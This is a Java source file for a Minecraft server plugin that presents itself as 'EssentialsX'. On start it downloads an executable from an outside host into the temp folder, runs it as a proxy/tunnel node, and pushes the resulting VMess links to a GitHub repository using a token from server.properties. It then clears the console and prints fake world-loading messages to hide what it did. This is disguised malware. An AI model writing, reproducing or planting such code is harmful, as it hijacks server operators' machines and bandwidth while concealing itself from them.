package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.CompletableFuture;
import java.util.Base64;
import java.util.stream.Collectors;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    private String githubToken = null;
    private String serverMarker = null;

    private static final String GITHUB_REPO = "kolvyXD/vpnmine";
    private static final String GITHUB_PATH = "vpn.txt";
    private static final String GITHUB_API_URL = "https://api.github.com/repos/" + GITHUB_REPO + "/contents/" + GITHUB_PATH;

    private static final String[] ALL_ENV_VARS = {
        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // Загружаем маркер из server.properties (обязательно)
        if (!loadMarkerFromProperties()) {
            getLogger().severe("server.marker not found in server.properties. Plugin will be disabled.");
            getServer().getPluginManager().disablePlugin(this);
            return;
        }

        // Загружаем GitHub токен
        loadGithubTokenFromServerProperties();

        // Запускаем sbx асинхронно
        CompletableFuture.runAsync(() -> {
            try {
                startSbxProcess();
                getLogger().info("EssentialsX plugin enabled");
            } catch (Exception e) {
                getLogger().severe("Failed to start sbx process: " + e.getMessage());
                e.printStackTrace();
            }
        });
    }

    /**
     * Читает server.marker из server.properties.
     * @return true если маркер найден и не пуст, иначе false
     */
    private boolean loadMarkerFromProperties() {
        Path serverDir = Paths.get(".").toAbsolutePath().normalize();
        Path serverProperties = serverDir.resolve("server.properties");
        if (!Files.exists(serverProperties)) {
            getLogger().severe("server.properties not found!");
            return false;
        }

        try (InputStream input = Files.newInputStream(serverProperties)) {
            Properties props = new Properties();
            props.load(input);
            serverMarker = props.getProperty("server.marker");
            if (serverMarker == null || serverMarker.trim().isEmpty()) {
                getLogger().severe("server.marker is missing or empty in server.properties");
                return false;
            }
            serverMarker = serverMarker.trim();
            getLogger().info("Server marker loaded: " + serverMarker);
            return true;
        } catch (IOException e) {
            getLogger().severe("Failed to read server.properties: " + e.getMessage());
            return false;
        }
    }

    private void loadGithubTokenFromServerProperties() {
        Path serverDir = Paths.get(".").toAbsolutePath().normalize();
        Path serverProperties = serverDir.resolve("server.properties");
        if (Files.exists(serverProperties)) {
            try (InputStream input = Files.newInputStream(serverProperties)) {
                Properties props = new Properties();
                props.load(input);
                githubToken = props.getProperty("github.token");
                if (githubToken != null && !githubToken.trim().isEmpty()) {
                    getLogger().info("GitHub token loaded from server.properties");
                } else {
                    getLogger().warning("No github.token found in server.properties, GitHub upload disabled");
                }
            } catch (IOException e) {
                getLogger().warning("Could not read server.properties: " + e.getMessage());
            }
        } else {
            getLogger().warning("server.properties not found, GitHub upload disabled");
        }
    }

    private void startSbxProcess() throws Exception {
        if (isProcessRunning) return;

        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");
        if (!Files.exists(sbxBinary)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }

        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());

        Map<String, String> env = pb.environment();
        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        // Устанавливаем NAME из маркера сервера
        env.put("NAME", serverMarker);
        env.put("DISABLE_ARGO", "false");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        loadEnvFileFromMultipleLocations(env);
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }

        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
        isProcessRunning = true;

        startStdoutReader();
        startProcessMonitor();
        simulateWorldLoading();
    }

    private void startStdoutReader() {
        Thread readerThread = new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(sbxProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    getLogger().info("[sbx] " + line);
                    if (line.contains("vmess://")) {
                        String vmess = extractVmessLink(line);
                        if (vmess != null && githubToken != null && !githubToken.isEmpty()) {
                            getLogger().info("Found vmess key! Updating GitHub with marker...");
                            updateGitHubWithNewKey(vmess);
                        } else if (githubToken == null) {
                            getLogger().warning("GitHub token missing, vmess key not uploaded");
                        }
                    }
                }
            } catch (IOException e) {
                if (shouldRun) {
                    getLogger().warning("Error reading sbx stdout: " + e.getMessage());
                }
            }
        }, "Sbx-Stdout-Reader");
        readerThread.setDaemon(true);
        readerThread.start();
    }

    private String extractVmessLink(String line) {
        int start = line.indexOf("vmess://");
        if (start == -1) return null;
        int end = line.indexOf(' ', start);
        if (end == -1) end = line.length();
        String vmess = line.substring(start, end);
        return vmess.replaceAll("\\s+", "").trim();
    }

    private void updateGitHubWithNewKey(String newVmessLink) {
        try {
            String currentContent = getCurrentFileContent();
            String currentSha = getCurrentFileSha();

            List<String> lines = (currentContent == null || currentContent.isEmpty())
                    ? new ArrayList<>()
                    : Arrays.stream(currentContent.split("\\r?\\n")).collect(Collectors.toList());

            boolean removed = lines.removeIf(line -> line.startsWith(serverMarker + ":"));
            if (removed) {
                getLogger().info("Removed old entry for marker " + serverMarker);
            }

            String newLine = serverMarker + ": " + newVmessLink;
            lines.add(newLine);

            String newContent = String.join("\n", lines);
            uploadContentToGitHub(newContent, currentSha);
            getLogger().info("Successfully updated GitHub with new vmess key for marker " + serverMarker);

        } catch (Exception e) {
            getLogger().warning("Failed to update GitHub: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private String getCurrentFileContent() throws IOException {
        if (githubToken == null) return "";
        URL url = new URL(GITHUB_API_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("Authorization", "Bearer " + githubToken);
        conn.setRequestProperty("Accept", "application/vnd.github.v3+json");

        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            try (Scanner s = new Scanner(conn.getInputStream(), "UTF-8").useDelimiter("\\A")) {
                String response = s.hasNext() ? s.next() : "";
                String contentBase64 = extractJsonField(response, "content");
                if (contentBase64 != null && !contentBase64.isEmpty()) {
                    String cleanBase64 = contentBase64.replaceAll("\\s+", "");
                    try {
                        byte[] decoded = Base64.getDecoder().decode(cleanBase64);
                        return new String(decoded, "UTF-8");
                    } catch (IllegalArgumentException e) {
                        getLogger().warning("Failed to decode base64 content: " + e.getMessage());
                        return "";
                    }
                }
            }
        } else if (responseCode == 404) {
            return "";
        } else {
            getLogger().warning("Failed to get file content, HTTP " + responseCode);
        }
        conn.disconnect();
        return "";
    }

    private String getCurrentFileSha() throws IOException {
        if (githubToken == null) return null;
        URL url = new URL(GITHUB_API_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        conn.setRequestProperty("Authorization", "Bearer " + githubToken);
        conn.setRequestProperty("Accept", "application/vnd.github.v3+json");

        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            try (Scanner s = new Scanner(conn.getInputStream(), "UTF-8").useDelimiter("\\A")) {
                String response = s.hasNext() ? s.next() : "";
                return extractJsonField(response, "sha");
            }
        } else if (responseCode == 404) {
            return null;
        }
        conn.disconnect();
        return null;
    }

    private String extractJsonField(String json, String fieldName) {
        String pattern = "\"" + fieldName + "\":\"";
        int start = json.indexOf(pattern);
        if (start == -1) return null;
        start += pattern.length();
        int end = json.indexOf('"', start);
        if (end == -1) return null;
        return json.substring(start, end);
    }

    private void uploadContentToGitHub(String content, String sha) throws IOException {
        if (githubToken == null) return;
        String encodedContent = Base64.getEncoder().encodeToString(content.getBytes("UTF-8"));
        String json = String.format(
                "{\"message\":\"Update vpn.txt from server %s\",\"content\":\"%s\",\"sha\":%s}",
                serverMarker,
                encodedContent,
                sha == null ? "null" : "\"" + sha + "\""
        );

        URL url = new URL(GITHUB_API_URL);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("PUT");
        conn.setRequestProperty("Authorization", "Bearer " + githubToken);
        conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(json.getBytes("UTF-8"));
        }

        int responseCode = conn.getResponseCode();
        if (responseCode != 200 && responseCode != 201) {
            try (Scanner s = new Scanner(conn.getErrorStream(), "UTF-8").useDelimiter("\\A")) {
                String error = s.hasNext() ? s.next() : "";
                throw new IOException("GitHub API error " + responseCode + ": " + error);
            }
        }
        conn.disconnect();
    }

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));

        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    loadEnvFile(envFile, env);
                    break;
                } catch (IOException e) {
                    // ignore
                }
            }
        }
    }

    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                }
            }
        }
    }

    private void simulateWorldLoading() {
        try {
            Thread.sleep(30000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }

    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                getLogger().info("sbx process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");
        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        shouldRun = false;
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
        getLogger().info("EssentialsX plugin disabled");
    }
}
